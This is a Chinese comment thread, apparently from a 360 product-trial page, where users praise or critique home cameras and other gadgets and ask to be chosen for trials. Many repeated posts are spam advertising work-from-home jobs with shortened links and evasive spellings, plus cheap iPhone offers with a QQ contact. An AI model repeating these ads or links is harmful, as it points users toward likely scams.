此职位可以在家工作，不限制工作时间，（宝妈、学生、上班族都可以）做的越多挣的越多～【dwz.cn/gkvFd】复制到 浏览器打开 ～有意博客联系我 ～ ～每夭5o~15o，我详细作讲解～
这要懒到什么程度
此职位可以在家工作，不限制工作时间，（宝妈、学生、上班族都可以）～【dwz.cn/gkvFd】复制到浏览器打开 ～有意博客联系我 ～ ～每夭5o~15o，我详细作讲解～
千言万语汇成两个字：NB
一直期待，有了360家庭卫士，让家变得更温情……
感觉很棒 。很期待
360总是有新的产品 期待.... 
希望价格低点 这样我就买个放在店里
我也申请了，家里有80多岁的老人，需要照顾，关心，照看他的老年并发症！
给力啊 真心想要一个
是呀，要钱吗
此职位可以在家工作，不限制工作时间，（宝妈、学生、上班族都可以）～【dwz.cn/gkvFd】复制到浏览器打开 ～有意博客联系我 ～ ～每夭5o~15o，我详细作讲解～
希望能使用，我会提更多有建设性建议
此职位可以在家工作，不限制工作时间，（宝妈、学生、上班族都可以）～【dwz.cn/gkvFd】复制到浏览器打开 ～有意博客联系我 ～ ～每夭5o~15o ，我详细作讲解～
期待你的到来
谢谢支持，我一定会写出更好的报告
期待给我提供试用的机会
此职位可以在家工作，不限制工作时间，（宝妈、学生、上班族都可以）做的越多挣的越多～【dwz.cn/gkvFd】复制到 浏览器打开 ～有意博客联系我 ～ ～每夭5o~15o，我详细作讲解～
期待给我提供试用的机会
要能防水呀
我觉着我试用几率万分之一，怎么说我家买电脑就开始用360了，也是老用户了，就不能给我一次试用？很喜欢这款产品
我也是想要一个
希望能得啊，360忠实用户
好厉害的样子
太棒了 无敌风火轮
不出意外的，依然没我，我依旧还是变遗忘的那个
真希望这宝贝可以录像传到电脑上，那就太完美了 
 神经病！！放在厕所啊你？？？？
哇 这个产品太酷了，不知道在室外大太阳下能不能有出色的表现。这个构思非常给力，不知道这个功能如何，待机时长如何。那个led投影的显示寿命如何。
安不安全，能不能保护隐私 
虽然没申请，但是看起来使用很麻烦，特别是安置的地方。
此职位可以在家工作，不限制工作时间，（宝妈、学生、上班族都可以）做的越多挣的越多～【t.cn/8sfyr3p】复制到 浏览器打开 ～有意博客联系我 ～ ～每夭5o~15o，我详细作讲解～
我爱360
此职位可以在家工作，不限制工作时间，（宝妈、学生、上班族都可以）做的越多挣的越多～【t.cn/8sfyr3p】复制到浏览器打开 ～有意博客联系我 ～ ～每夭5o~15o，我详细作讲解～ 
我估计这东西比较费电，重量应该很轻，还有一个问题就是识别率的问题
要是真的生产出来和图片上的一样的话 肯定销量大增！
希望能选到我？
首页那个广告图
外形漂亮，不过做成圆形给生产上带来挑战，很多空间利用上就比较麻烦。毕竟很多电子元件都似乎长方形的，为了配合这个圆形设计可能要下点功夫了
欧典老图的感觉，
防抖效果不知道如何
不错   赞一个
如果要求精度高的产品，易溶解的方式会不会影响精度
最重要的是要清晰。
高大上，好想要一个
I love 360希望能选到我,谢谢！
这个好，如果有卖的我一定出手
这个产品太棒了
自从有360，一直就用着。确实做得挺好的360.继续努力。。。。
很期待试用哦
因业务发展招淘宝傔职人员，有意者请博客联系我【 http://t.cn/8sfyr3p】复制到地址栏打开。要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。
酷爆了！！！好有创意！！
我爱360
～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～
～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以） 【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ 
让我中个好吗
希望能让我免费试用下！！
一定要选到我
你奥特曼了
看起来比其他好很多 一直都在用360，本人也是360的忠实用户。也希望有一个像这样的东西 期待着有这件产品。
～不限制工作时间，做的越多挣的越多～ ～（宝妈、学生、上班族都可以） 【http://t.cn/8sfyr3p】复制到 浏览器打开 ～  
这个很不错诶 超级方便 就不知道出来后价位会是怎么样的
支持，希望越做越好
----好给力 ， 真心想要一个
360粉丝党啊 赞一个
我买手机用360电脑也是360的，给我一个试用吧！
这个设计 超级大胆的说
～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以） 【http://t.cn/8sfyr3p】复制到 浏览器打开 ～  
正常人都可以赞一个，放在家里好洋气，很美观实用
既然是插座，除了USB供电外，标准的5眼和3眼插座应该也不能少吧？还有非USB的外接设备呢。带电力品质监测和用电量统计功能吗？
好像要！！！
期待试用！求360选中我
已经第9期了，真的会流放体验名额出来么？
帅！！！！！！！！
更快路况播报，实时监控测速，地图内存强大，信息更新及时。拥有小蜜开车更安全，生活更快乐！永远支持360！
更快路况播报，实时监控测速，地图内存强大，信息更新及时。拥有小蜜开车更安全，生活更快乐！永远支持360！
～ 不限制工作时间，做的越多挣的越多～ ～（宝妈、学生、上班族都可以） 【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ 
在忙碌和重压的现实生活状态中，家中拥有360家庭卫士，可以让忙碌的工作中的我们随时随地实时了解家中的一切，随时可视聊天，关心家中年迈的父母和吱呀学话的宝宝，可以随时观察到家中的一切状态。让家变得更温馨，更安全
为何要安装在墙上呢，能移动的也挺好。
阿狸的不实惠啊！本人买的是普通的土豪金款，实惠，好用 这才是平明老板姓的福音
这个要钱吗？  
看着很可爱、功能强大、有要要火的苗头...
支持360，希望越做越好，选上我
哇塞 土豪开的
突然感觉奇虎要颠覆互联网硬件市场了，很赞啊
一直再用360的产品
特别钟爱小巧精致的物件，看着介绍小蜜的功能蛮多的呢~ 貌似很适合平常总会丢三落四又有点路痴的人们，真心期待幸运女神的垂青，感谢360，永远支持您！！！ 
特别钟爱小巧精致的物件，看着介绍小蜜的功能蛮多的呢~ 貌似很适合平常总会丢三落四又有点路痴的人们，真心期待幸运女神的垂青，感谢360，永远支持您！！
特别钟爱小巧精致的物件，看着介绍小蜜的功能蛮多的呢~ 貌似很适合平常总会丢三落四又有点路痴的人们，真心期待幸运女神的垂青，感谢360，永远支持您！！
360卫士 牛爆了 ！！各种电脑 手机病毒一把抓！！！！！！！！！给力！！！！！！！！
戴耳机用智键怎么破、、？比如玩游戏但公共场合又必须戴耳机。怎么办
特别钟爱小巧精致的物件，看着介绍小蜜的功能蛮多的呢~ 貌似很适合平常总会丢三落四又有点路痴的人们，真心期待幸运女神的垂青，感谢360，永远支持您！！
特别钟爱小巧精致的物件，看着介绍小蜜的功能蛮多的呢~ 貌似很适合平常总会丢三落四又有点路痴的人们，真心期待幸运女神的垂青，感谢360，永远支持您！！
很期待！！！
特别钟爱小巧精致的物件，看着介绍小蜜的功能蛮多的呢~ 貌似很适合平常总会丢三落四又有点路痴的人们，真心期待幸运女神的垂青，感谢360，永远支持您！！
几时才有的买呀，我想要
360啊，妄我支持你这么多年，你现在也开始山寨了，真有点受不了你，有多少监控生产厂家早在两年前就推出这种摄像头了，你现在才出，淘宝搜一下，无线网络摄像机，出来一大堆。真受不了周鸿伟了。跟着麻花学走路，没有什么出路的，要创新，才是正道。
我是真的需要啊，家里带娃的真是不让人放心呢
360啊，妄我支持你这么多年，你现在也开始山寨了，真有点受不了你，有多少监控生产厂家早在两年前就推出这种摄像头了，你现在才出，淘宝搜一下，无线网络摄像机，出来一大堆。真受不了周鸿伟了。跟着麻花学走路，没有什么出路的，要创新，才是正道。
一直使用360，从未改变
360啊，妄我支持你这么多年，你现在也开始山寨了，真有点受不了你，有多少监控生产厂家早在两年前就推出这种摄像头了，你现在才出，淘宝搜一下，无线网络摄像机，出来一大堆。真受不了周鸿伟了。跟着麻花学走路，没有什么出路的，要创新，才是正道。
360啊，妄我支持你这么多年，你现在也开始山寨了，真有点受不了你，有多少监控生产厂家早在两年前就推出这种摄像头了，你现在才出，淘宝搜一下，无线网络摄像机，出来一大堆。真受不了周鸿伟了。跟着麻花学走路，没有什么出路的，要创新，才是正道。
Ｉ　Want　To 
360啊，妄我支持你这么多年，你现在也开始山寨了，真有点受不了你，有多少监控生产厂家早在两年前就推出这种摄像头了，你现在才出，淘宝搜一下，无线网络摄像机，出来一大堆。真受不了周鸿伟了。跟着麻花学走路，没有什么出路的，要创新，才是正道.
期待中。。。。
赞赞赞赞赞赞赞赞
原来生活变得更美好。
希望360的功能可以更齐全，不过还是要顶360的。O(∩_∩)O谢谢。
原来生活变得更美好。
原来生活变得更美好。
这个确实比监视器好用，希望能得到试用，试试看
好东西！！！已申请，主页君求抽中！
创意不错,希望能够做的更薄.
期待这样的好产品赶快普及
赞一个，超级喜欢，可以和云盘绑定吗 
我也想要啊
十分支持360出这种活动，使好东西和大家一起分享。
求选中 试用
～ 不限制工作时间，做的越多挣的越多～ ～（宝妈、学生、上班族都可以） 【http://t.cn/8sfyr3p】复制到 浏览器打开 ～  
苍天啊  让我中一次吧   我绝对对你拜拜
就是想要的东西！就是不能***，上市了也要买啊！非常赞
非常期待，我希望360家庭卫士研发人员，奇酷活动负责人，360的周董等人能选上我！ 　　　　我不走运，谁走运！　　　　　　祝360越来越强大！　　　                    【希望我可以中个上上签】
上传快与手机同步，画质好，这些应该很重要
～ 不限制工作时间， 做的越多挣的越多～  ～（宝妈、学生、上班族都可以） 【http://t.cn/8sfyr3p】复制到 浏览器打开 ～  
希望获得……
我想要 啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊
～ 不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以） 【http://t.cn/8sfyr3p】复制到 浏览器打开 ～   
好好偶给我一个吧 
什么时候出来啊？
出360套餐吗？【键盘·鼠标·鼠标垫·摄像头·音响·显示屏】
～ 不限制工作时间， 做的越多挣的越多～ ～（宝妈、学生、上班族都可以） 【http://t.cn/8sfyr3p】复制到 浏览器打开  ～  
在美国买了一个，挺好用的，能称体重，测脂肪率，测心率，检测CO2什么的。好评！
我都自己做过一个   做的是  初音 的
大爱360
正是我最近关注在产品，正准备买呢。希望早点上市。
同感，我也是想用来看孩子，
如果再加上最新的监控移动追踪功能（根据移动物体通过微云台而移动方位并调整焦距）清晰的记录小偷的面部特征，才叫完美，当然如果自带电源（电能的施用时长是个问题）和存储设备（存储器的空间也是个问题）会更好，希望改进
～ 不限制工作时间，做的越多挣的越多 ～ ～（宝妈、学生、上班族都可以） 【http://t.cn/8sfyr3p】复制到 浏览器打开 ～
非常期待试用360家庭卫士！
好像要!!!! 
着大家也相信 啊    这就是个个人生活和经济的免费普查啊   
～ 不限制工作时间， 做的越多挣的越多 ～ ～（宝妈、学生、上班族都可以） 【http://t.cn/8sfyr3p】复制到 浏览器打开 ～  
这个对邻居把房屋租出去，可以用来监控自己家的房间，防小偷，也可以用来看人不在家的时候，猫咪在干吗
很不走运啊，一次都没被选上过，希望这次是个例外，支持360.
爱上了360...
很少期待，不知道试用的幸运会不会降临我身上，试用选择了我，也不枉费我一如既往的支持360了。
别种人家的穿套，我只实话实说，再说50个   你觉得你有机会得到吗   傻掉
so cool
要怎么样才能免费获得360卫士3摄像头呢。
要怎么样才能免费获得360卫士3摄像头呢。
好！希望能有！
～ 不限制工作时间， 做的越多挣的越多 ～ ～（宝妈、学生、上班族都可以） 【http://t.cn/8sfyr3p】复制到 浏览器打开 ～  
～ 不限制工作时间， 做的越多 挣的越多 ～ ～（宝妈、学生、上班族都可以） 【http://t.cn/8sfyr3p】复制到 浏览器打开 ～  
哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈好
这个产品挺好的!
要是整个智能打扫清洁的就更好了。周末就不用麻烦了
好想要，还有吗
～ 不限制工作时间，做的越多 挣的越多 ～ ～（宝妈、学生、上班族都可以） 【http://t.cn/8sfyr3p】复制到 浏览器打开 ～  
送我行吗？
好主意！永远不会来迟，给位大神不妨看看提的建议有没有创新性
非常期待它的上市，真想要一台，我希望价格能够低一些.支持360！！！！！！！！！ 
科技改变生活
我也提交了申请，不知道能不能被选中
但愿得个摄像头O(∩_∩)O，360加油！
出来这产品不错！我期待中，希望能帮到我监视宝宝的安全
家人。孩子。老婆。希望我全部寄托在360身上了 就算这次不走运555555，期待！
建议可以内插sd卡或者直接和云盘绑定直接将录像上传到云盘，方便回放和事故取证等 谁也不可能天天拿着手机在哪看着吧！客户端最好出一个pc端 这样大人可以边上班变看孩子在家是在写作业还是打游戏~
360老板捐款了(*^__^*) 嘻嘻……，不差个摄像头啦！O(∩_∩)O哈哈哈~
如果再加上最新的监控移动追踪功能（根据移动物体通过微云台而移动方位并调整焦距）清晰的记录小偷的面部特征，才叫完美，当然如果自带电源（电能的施用时长是个问题）和存储设备（存储器的空间也是个问题）会更好，希望改进 
 希望拥有 这样会很方便。
很好很实用东西
申请中，这个东西好好哦，快快选中我哦。相信会以风一样的速度普及的。希望可以退出更加丰富多彩的智能设备。赞赞赞！
～ 不限制工作时间，做的越多 挣的越多 ～ ～（宝妈、学生、上班族都可以） 【http://t.cn/8sfyr3p】复制到 浏览器打开 ～
如果再加上最新的监控移动追踪功能（根据移动物体通过微云台而移动方位并调整焦距）清晰的记录小偷的面部特征，才叫完美，当然如果自带电源（电能的施用时长是个问题）和存储设备（存储器的空间也是个问题）会更好，希望改进
～ 不限制工作时间，做的越多挣的越多 ～（宝妈、学生、上班族都可以） 【http://t.cn/8sfyr3p】复制到浏览器打开 ～
～ 不限制工作时间，做的越多挣的越多 ～ ～（宝妈、学生、上班族都可以） 【http://t.cn/8sfyr3p】复制到 浏览器打开 ～
上班的麻麻再也不担心孩子暑假不学习了
～ 不限制工作时间，做的越多 挣的越多 ～ ～（宝妈、学生、上班族都可以） 【http://t.cn/8sfyr3p】复制到 浏览器打开 ～
2B!不解释!
确实挺方便，毕竟如果郑重其事的在家里装摄像头也不可能，这种360的小型摄像头倒是挺适合所有家庭的
云盘绑定直接将录像上传到云盘，能保存资料，百度好像也做的，希望360能超越！
没有关注官方微信就没有申请资格吗？ 
支持立体声就好了，建议做那种处理，一般手机接收什么，旁边的一些影响或是扩音器都会兹兹响
希望支持二次开发，提供sdk开发包
运气成分太大~~重在参与~ 
我已经关注了奇酷网官方微信，并且2也填写了申请资料，很希望能抽中我奥，期待宝贝上市支持360
顶   不解释
运气成分太大~~重在参与~ 
很想申请，可惜没车，不过还是支持一下。
～ 不限制工作时间，做的越多 挣的越多 ～ ～（宝妈、学生、上班族都可以） 【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ 
～ 不限制工作时间，做的越多挣的越多 ～ ～（宝妈、学生、上班族都可以） 【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ 
觉得应该做一个一周的总括数据，比如这周的折线图什么的，这样也能激励人锻炼，发现自己哪儿还可以加大运动量，把它做得能与手机连接显示更加详细的数据
非常期待，我希望360家庭卫士研发人员，奇酷活动负责人，360的周董等人能选上我！ 　　　　我不走运，谁走运！　　　　　　祝360越来越强大！　　　 【希望我可以中个上上签】 
好希望得一个
来货 我要
喜欢，希望能申请到
～ 不限制工作时间，做的越多 挣的越多 ～ ～（宝妈、学生、上班族都可以） 【http://t.cn/8sfyr3p】复制到 浏览器打开 ～  
看的介绍，宝贝好东西，不知能不能选中。
～ 不限制工作时间，做的越多挣的越多 ～ ～（宝妈、学生、上班族都可以） 【http://t.cn/8sfyr3p】复制到 浏览器打开 ～  
很酷哦，大力支持
～  不限制工作时间，做的越多挣的越多 ～ ～（宝妈、学生、上班族都可以） 【http://t.cn/8sfyr3p】复制到浏览器打开 ～  
动辄万把块,钱多烧得慌买他没问题.屌丝就不要买了.
本人这里除了360随身听以外，哪个无线网络也连接不上，我也非常非常非常纳闷，戴尔电脑怎么会这样呢？ 
期待上市。。。。赞。。。。
希望很够选上我啊！
要是手臂上投点花纹什么的就跟好了，让人感觉是很酷的纹身 
360大品牌，值得信赖！王者风范、鹤舞白沙，我心飞翔、超凡脱俗，醇和满足、奋斗中拥有!自然最健康，绿色好心情~防盗防贼防小四，有它有我有真爱！！！！
好创意永远不会过时！好主意永远不会来迟！360家庭卫士我来了！
套餐一：全款3500元购买iPhone5s  套餐二：全款2900元购买iPhone5c  套餐三：全款2900元购买iPhone5     套餐四：全款2100元购买iPhone4S    套餐五：全款2200元iPad4 QQ81901132 骗子绕道，厂家拿货
套餐一：全款3500元购买iPhone5s  套餐二：全款2900元购买iPhone5c  套餐三：全款2900元购买iPhone5     套餐四：全款2100元购买iPhone4S    套餐五：全款2200元iPad4 QQ81901132 骗子绕道，厂家拿货
什么时候能上市啊？.........加油啊值得拥有啊
建议把图标和数字什么的设计的更有艺术感，不要这种很标准的文字。
套餐一：全款3500元购买iPhone5s  套餐二：全款2900元购买iPhone5c  套餐三：全款2900元购买iPhone5     套餐四：全款2100元购买iPhone4S    套餐五：全款2200元iPad4 QQ81901132 骗子绕道，厂家拿货
关于目前网络状况也都可以支持了，应该是从CIF到4M的720P码流都是可调的，可以适应自己的网络状况，这点一般情况下都可以做到。至于其他的功能，争取可以完美的实现以下两种功能，第一，移动报警时，可以实时上传至手机客户端，并向手机客户端发送前后10秒的视频，可以清楚地分析报警情况，这一点肯定要有SD卡存储支持了。第二，360应该提供免费的用户云盘，进行云盘存储，因为SD卡存储空间有限，存储时间较短
多放点呀。。。50太少了呀，这么多360用户呢
我的睡眠就很差，真希望有一款呢
这个要是能够降低辐射什么的就好了
15帧每秒，这反应也太慢了吧。。。
非常期待的好东西~选我呀~~~
～ 不限制工作时间，做的越多挣的越多 ～ ～（宝妈、学生、上班族都可以） 【http://t.cn/8sfyr3p】复制到浏览器打开 ～  
～不限制工作时间， 做的越多挣的越多 ～ ～（宝妈、学生、上班族都可以） 【http://t.cn/8sfyr3p】复制到浏览器打开 ～  
期待ing
我是360忠实用户 好希望得一个 我一直在支持360
好帅，霸气外漏
好希望自己中奖  期待
哈哈，期待哦！
好科幻的样子
期待啊，感觉很适合我啊
看上区不错
这个牛，不我的破直升机好多了。
能拥有360家庭卫士摄像头是一件多么幸福的事啊！
是连电脑使用还是怎么用啊
貌似不错，点个赞。
～不限制工作时间， 做的越多挣的越多 ～ ～（宝妈、学生、上班族都可以） 【http://t.cn/8sfyr3p】复制到浏览器打开 ～  
～不限制工作时间， 做的越多挣的越多 ～ ～（宝妈、学生、上班族都可以） 【http://t.cn/8sfyr3p】复制到浏览器打开  ～  
公交 公共场合上，360FiVi就自动离线。m34g网络急速手机下载了e线我先网络连接和信号增强软件竟也丝毫不起作用 所以还是想看看360的产品在出游的途中到底如何
眼熟眼熟眼熟眼熟眼熟眼熟眼熟眼熟眼熟眼熟眼熟眼熟眼熟眼熟眼熟眼熟眼熟眼熟眼熟眼熟眼熟眼熟眼熟眼熟眼熟眼熟眼熟眼熟眼熟眼熟眼熟眼熟眼熟眼熟眼熟眼熟眼熟眼熟眼熟
期待。。。。 
给你32个赞
很想申请，可惜没车，不过还是支持一下。
从用电脑  智能手机就一直是用360    超爱360
虽然早就在香港看到可以随时关注宝宝的摄像头，但是国内应该试试第一次大规模推广，希望会获得成功 
支持360
加上安全预警、导航功能，
怎么涨价了啊  
这个是真的非常实用啊，希望申请成功
宝贝介绍不错，期待试用中。360的忠实用户，除了XP盾，其他安全问题完全交给360了。（WIN7系统）
这是有的多给力！
我想问个重要的问题，没电来的话还可以用吗？
你也真会拍。。
很想试用一下，我是路盲，希望这期能收到
大力支持360，不一定要抽中我，但我还是支持360！！！
迫切需要，期待！
期待我被选上
广州 五滴水 微信系统开发  www.5h20.com  我们公司已经有这样的插座啦 需要的可以联系  每个58元
非常好呀，改变我们的生活
多少钱啊，机箱在酷点，比如变形金刚为背景就好了 
说真的 360的这个东西我最喜欢了！！！
嗯 比第一批在硬件上已经软件上都有改进 第一批bug太多了~~
既然是家庭安全，能不能设计的不要像摄像头啊！把底座的360 LOGO去掉，只要贼不二，肯定会把它给黑掉的。
好东西，与大家分享！
我写了很多的想象和新鲜功能。希望能中吧
我的手机是苹果5能用吗
东西确实不错
我也想申请，可惜没车，还是把机会留给别人吧！支持一下！
需不需要上网呢
建议360再加个照明功能，适合晚上拍。
呵呵  东西确实不错     永远支持360
加油360 
LZ那本书的名字叫什么？
什么时候能面市呢？会很受欢迎哦！我也想要一个，会很实用。
其实就是中国给他造的成品.
想买，但没那个能力 
从用电脑 智能手机就一直是用360 超爱360 
～不限制工作时间， 做的越多挣的越多 ～ ～（宝妈、学生、上班族都可以） 【http://t.cn/8sfyr3p】复制到浏览器打开 ～  
～不限制工作时间， 做的越多挣的越多 ～ ～（宝妈、学生、上班族都可以） 【http://t.cn/8sfyr3p】复制到浏览器打开  ～  
20000多人选50个中奖太少太稀有了吧
提交了申请，期待中
僧多粥少，期待中大奖
不错的活动，！试试！！
～不限制工作时间， 做的越多挣的越多 ～ ～（宝妈、学生、上班族都可以） 【http://t.cn/8sfyr3p】复制到浏览器打开 ～  
～不限制工作时间， 做的越多挣的越多 ～  ～（宝妈、学生、上班族都可以） 【http://t.cn/8sfyr3p】复制到浏览器打开 ～  
～不限制工作时间， 做的越多 挣的越多 ～ ～（宝妈、学生、上班族都可以） 【http://t.cn/8sfyr3p】复制到浏览器打开 ～  
不错的IDY！！
好喜欢！！
支持360
我寻找多年的梦想将变成现实，智能家庭我喜欢，我爱你。
希望中标，商用试下
    外形永远不是检验一款科技产品的真理，只有产品的真正用户体验和售后服务！希望360开发的产品能够更好的回馈消费者，能够听取消费者的建议并且不断改进产品的性能！
～不限制工作时间， 做的越多 挣的越多 ～ ～（宝妈、学生、上班族都可以） 【http://t.cn/8sfyr3p】复制到浏览器打开 ～  
非常需要，坐等试用成功！！
真不错！！！ 
啥时候上市，好期待
～不限制工作时间， 做的越多挣的越多 ～ ～（宝妈、学生、上班族都可以） 【http://t.cn/8sfyr3p】复制到浏览器打开 ～  
设计理念不错，不过耗材不好购买，设备维修点少，普及率低。
材料好买吗？在哪买？价格多少？
我们家全是用的360的产品 随身WIFI一出 我就买了 电脑上是用的360卫士 手机上也是用的360卫士和360手机助手。 力挺360 加油！
不错，关注！
好酷，很喜欢
在哪能买到~！？ 
支持，支持~~~~~~~
360已成为我生活中的一份子密不可分，我坚信只要是360必是精品，但愿被选中去体验360的强大和体贴。支持360.
会好用吗？不知道效果怎么样？不要坑爹哦
只要那个摄像头 可以吗？
如若智能，则更喜欢。
希望360产品越来越好！ 
家里已购买了二台网络监控摄像机，想试用一下360的这款产品，对比一下。
免费开微店，还赚佣金，超级棒：【http://t.cn/RP7dEX5】复制到浏览器打开哦
你不是么？
～不限制工作时间， 做的越多 挣的越多 ～ ～（宝妈、学生、上班族都可以） 【http://t.cn/8sfyr3p】复制到浏览器打开 ～  
～不限制工作时间， 做的越多挣的越多 ～ ～（宝妈、学生、上班族都可以） 【http://t.cn/8sfyr3p】复制到浏览器打开 ～  
～不限制工作时间， 做的越多挣的越多 ～ ～（宝妈、学生、上班族都可以） 【http://t.cn/8sfyr3p】复制到浏览器打开  ～  
建议往更智能的方向发展，比如说人脸识别追踪，三屏智能互联，光线调焦......
僧多粥少，期待中大奖 
～不限制工作时间， 做的越多挣的越多 ～ ～（宝妈、学生、上班族都可以） 【http://t.cn/8sfyr3p】复制到浏览器打开 ～   
僧多粥少，期待中大奖 
僧多粥少，期待中大奖 
希望360越办越好加油
希望可以中哦！
～不限制工作时间， 做的越多挣的越多 ～ ～（宝妈、学生、上班族都可以） 【http://t.cn/8sfyr3p】复制到浏览器打开 ～  
～不限制工作时间， 做的越多挣的越多 ～  ～（宝妈、学生、上班族都可以） 【http://t.cn/8sfyr3p】复制到浏览器打开 ～  
我好喜欢但不是MI而是M2，有机会弄他一个。
15桢/秒，开什么玩笑，这样子的录象肯定会有明显的停顿！！！
真的很需要，真的很想要，而且满足电脑盲的妈妈的操作，真的希望中将
就给我吧……
我想买一个,什么时候才发售呢,多少钱一个 
有买的，才几百快
有买的，才几百快 
有买的，才几百快 
很吸引人，有点弱智。
我真没运气，还没中过奖 ，希望这次能中
有买的，才几百快 
～不限制工作时间， 做的越多挣的越多 ～ ～（宝妈、学生、上班族都可以） 【http://t.cn/8sfyr3p】复制到浏览器打开 ～  
～不限制工作时间， 做的越多挣的越多 ～  ～（宝妈、学生、上班族都可以） 【http://t.cn/8sfyr3p】复制到浏览器打开 ～  
加上导航功能，电子狗，路况提示
amazon上不是早有了吗？ 这是广告贴吗？ 
真的希望抽中吧......
我去。这个价格蛋疼。
～不限制工作时间， 做的越多挣的越多 ～ ～（宝妈、学生、上班族都可以） 【http://t.cn/8sfyr3p】复制到浏览器打开 ～  
都是广告贴
快到碗里来！
抽中就好了   哈哈
祈福好运气
但愿能试用一下
我的手机只有Android系统，可惜啊，羡慕啊！
要用这个估计不知是用一个了，家里装这个应该会装三四个，一个手机终端能够控制多台设备吗？
我一定不会被抽中，我不抱希望哈哈
免费试用期多长？真的免费适用?还是货到付款？
哈哈好东西上市了买一个
求中小水滴
漂亮，真心不错！
爱死你了。360
赶紧推出吧，座等
哈哈  女朋友我来了！！
这只手表太酷了
～不限制工作时间， 做的越多挣的越多 ～ ～（宝妈、学生、上班族都可以） 【http://t.cn/8sfyr3p】复制到浏览器打开 ～  
～不限制工作时间， 做的越多 挣的越多 ～ ～（宝妈、学生、上班族都可以） 【http://t.cn/8sfyr3p】复制到浏览器打开 ～  
好想要一个的呢
未来的生活即将变成现实！
怒赞。太原百货就有卖的
什么时候才能发行呢，座等发行，买来给小孩子带。可防走失！
这只太酷了
这和自由有什么关系...又不上不让你到处玩,只是让家长知道你在哪里而已.现在人贩子那么多.
家中只有老俩口，经常外出旅游的确需要类似监控设备，也用过红外线监控器，争取试用比较一下谁更简洁、方便、效果佳！
期待中...
希望是我，哈哈，祝你们好运
这个车很容易上手 代步也很拉风 不过我一想到是代步 立马在脑袋里把常走的路线过了一遍 走公路肯定不行 太不安全 走人行道吧 人行道比公路高约10公分 我们这边很多地方的人行道在过马路的地方没有设置专门和公路接轨的下坡口 那就得提车下道 过了马路又提车上道 估计 在旁人的眼神里就会从飘逸 拉风 变成气踹嘘嘘的劳累形象吧 ^_^  
免费的东西总要付出代价的，不要想着天上会掉馅饼。
好期待，这个是多么方便呀，可以轻松知道家中的一切，避免意外发生
建议往更智能的方向发展，比如说人脸识别追踪，三屏智能互联，光线调焦......如果再加上最新的监控移动追踪功能（根据移动物体通过微云台而移动方位并调整焦距）清晰的记录小偷的面部特征，才叫完美，当然如果自带电源（电能的施用时长是个问题）和存储设备（存储器的空间也是个问题）会更好，希望改进 
建议往更智能的方向发展，比如说人脸识别追踪，三屏智能互联，光线调焦......如果再加上最新的监控移动追踪功能（根据移动物体通过微云台而移动方位并调整焦距）清晰的记录小偷的面部特征，才叫完美，当然如果自带电源（电能的施用时长是个问题）和存储设备（存储器的空间也是个问题）会更好，希望改进  
建议往更智能的方向发展，比如说人脸识别追踪，三屏智能互联，光线调焦......如果再加上最新的监控移动追踪功能（根据移动物体通过微云台而移动方位并调整焦距）清晰的记录小偷的面部特征，才叫完美，当然如果自带电源（电能的施用时长是个问题）和存储设备（存储器的空间也是个问题）会更好，希望改进  
好期待，这个是多么方便呀，可以轻松知道家中的一切，避免意外发生  
希望与描述一样.期待中
啥时候能买？？
快点开始售卖吧，申请试用没申请到，想赶紧买一个回来给孩子玩玩
续航 续航
good!
太好啦，这样心里会好些
有木有 有木有 有木有 
希望抽中，刚好家里视频坏了
很好，赞一个，顶！
电能只不过把污染前置或后置了，没真正的减少污染。电能的产生带来的污染也很严重的。
好想要一个的呢 爱死你了。360 好期待，这个是多么方便呀，可以轻松知道家中的一切，避免意外发生 
太好了，还有这样东西，很想得到一个。
想要一个这么好的产品啊，家庭卫士
太大，如果做成戒指应该会好点吧
快点出产品，试用后写报告。
因为参数没热点，其他同类产品也都能实现！
这个东西很试用，期待赶紧发售吧，我想买一个
好期待，这个是多么方便呀，可以轻松知道家中的一切，避免意外发生  
联想看家宝功能比360强大多了,联想早就有了.大家可以在天猫查:云赛数码专营店 我是那个店的掌柜,如果大家需要,我可以给你们优惠哦!
一个够不够，家里装这个应该会装三四个，一个手机终端能够控制多台设备吗？ 
如果被坏人破了密码盗取进入了，那不是所有隐私和家庭情况都让别人知道了，还可能被用来威胁家人。
真的是太实用了，太适合自己APP应用了，非常想拥有！！
很高兴看到360不断的进步，真正让老百姓得到了实惠。
我经常找不到手机，赶紧推出呀
神魔时候才能出来啊 
有了它——QQ我就不用了！
这么好的产品，去哪里找？
如果音质不好，有啥都是渣渣
参加的话至少还有机会，不参加的话一定没有机会。
双向通话，这个不错！
这个能不能穿透宽带通之类的网络，有个网络摄头，用花生壳之类的DDNS无法穿透，外网不能访问
我也非常需要这个，我和爱人工作忙早出晚归的家有宝宝和保姆真希望得到一个啊。谢谢您了 ~~!!
～ ～不限制工作时间，做的越多  挣的越多～～（宝妈、学生、上班族都可以） ～每夭5o~15o，我详细作讲解～  有意者博客联系我  http://t.cn/8sfyr3p
